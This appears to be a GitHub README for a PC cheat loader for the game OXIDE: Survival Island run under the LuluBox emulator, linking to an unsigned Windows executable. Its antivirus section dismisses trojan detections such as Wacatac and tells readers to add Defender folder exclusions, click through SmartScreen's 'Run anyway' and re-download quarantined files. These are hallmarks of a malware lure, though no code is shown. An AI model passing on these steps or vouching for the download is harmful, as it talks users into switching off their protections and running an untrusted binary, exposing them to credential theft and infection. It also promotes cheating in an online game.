## 🧬 What this is

Oxide is a cheat for **OXIDE: Survival Island** played on a **PC through the LuluBox emulator**.

The game stays the official one from Google Play. Nothing is repacked, nothing is replaced — the loader runs on top of the official client and does its work from outside the game's own build. That's the entire design premise, and it's why a game patch doesn't force you to re-download a 700 MB "modded" APK from someone who'll abandon it next month.

Hard requirements, no way around them: **LuluBoxSuper 2.1.2 exactly** — not "latest", not 2.0.x — plus the separate **JARVIS OXIDE** loader, both added to LuluBox with **SandBox enabled** for each. No root, no PC-side driver, no patched images. Internet is needed on the **first key login only**.

Hostile by name, external by nature: everything happens from the host side, in the place the game has no reason to police.

> [!IMPORTANT]
> **Read [Quick start](#-quick-start) first.** Nine out of ten "it doesn't work" cases are a wrong LuluBoxSuper version, a disabled SandBox, or launching the game from the home-screen shortcut instead of through the loader.

## 🚀 Quick start

In order. Skipping steps is the standard failure mode.

**1. Get the loader.** → <a href="https://github.com/DiscordInvestor/oxide-cheat-pc/releases/latest"><b>⤓ DOWNLOAD (Windows x64)</b></a> — extract it where you'll find it again, no installer.

**2. Install the official game** from Google Play and let it download fully. Keep it installed; the cheat runs on top of it.

**3. Install LuluBoxSuper `2.1.2`.** Not the newest, not a "recommended" fork — `2.1.2`.

**4. Add both apps to LuluBox** — LuluBoxSuper itself and the JARVIS OXIDE loader.

**5. Enable SandBox for each of them.** Both. The loader won't attach without it.

**6. Start the game from inside LuluBox**, then start the loader the same way. Never via the home-screen shortcut.

**7. Paste your key** into the `JARVIS | OXIDE` window on first launch and press **Sign in** — the whole key, in one piece.

**8. Tune and play.** Menu → FOV, ESP, loot filter.

## 🦠 Why your antivirus hates this file

It will flag. It is not a miner.

### The portrait of a suspicious binary

A loader does exactly what a loader should: opens a foreign process, asks for full memory access, reads large regions, writes into them. Heuristics keep a slot for "looks like it injects", and this occupies that slot perfectly. The heuristic isn't wrong — the family resemblance is genuine.

Three things finish the job:

1. **No code signing.** A certificate is money and an organisation identity. An unsigned binary that writes into another process is free detections.
2. **No reputation.** A fresh build is known to literally nobody, which reads as *suspicious* rather than *unknown*.
3. **Layered chain.** Host → emulator → guest → game looks like four levels of obfuscation to a scanner that only sees the first.

### What you'll actually see

| Source | Verdict | In human |
|---|---|---|
| Windows Defender | `Trojan:Win32/Wacatac.B!ml` | The hereditary surname of this scene |
| Kaspersky | `HEUR:Trojan.Win32.Generic` | "Didn't look, but something's off" |
| Avast / AVG | `Win32:Malware-gen` | Preemptive, on principle |
| Malwarebytes | `MachineLearning/Anomalous.100%` | Honest about guessing |

### Installing without a fight

**Option A — exclusion (5 minutes, permanent):** Windows Security → Virus & threat protection → Manage settings → Exclusions → Add folder → the loader folder.

**Option B —** SmartScreen → *More info* → *Run anyway*. One click, valid until the next build.

**Option C —** already quarantined? Just download it again; recovering a swallowed exe is more work than refetching.

> [!TIP]
> The SHA256 of every build is in the release notes. If yours differs, you didn't get it from here.

## 🧯 Troubleshooting

| Symptom | Cause / fix |
|---|---|
| Loader closes instantly | Not launched through LuluBox. Use LuluBox, not the shortcut |
| `attach failed` | SandBox off for one of the two apps. Both must have it on |
| Login says invalid key | Key pasted in fragments or with a stray character. Clear the field, paste the whole string at once |
| Login hangs | First login needs internet — check the guest's connection, not just the host's |
| Game crashes on boot | Wrong LuluBoxSuper version. `2.1.2`, exactly |
| Overlay invisible | Exclusive fullscreen → switch the guest to borderless |
| Aim overshoots | Recalibrate sensitivity per preset; game multiplier ≠ host cursor speed |
| Settings reset | Profile not saved — `Profiles → Save` before exiting, not after |
| Emulator dies mid-session | RAM budget. Close extra instances |
| Virtualization errors on boot | Hyper-V/Core Isolation on, or VT-x off in BIOS |
| "corrupted file" | Broken download over a flaky proxy. Refetch, match the SHA256 |

Still stuck → [Issues](https://github.com/DiscordInvestor/oxide-cheat-pc/issues) with host build, LuluBoxSuper version, loader version, log and steps.
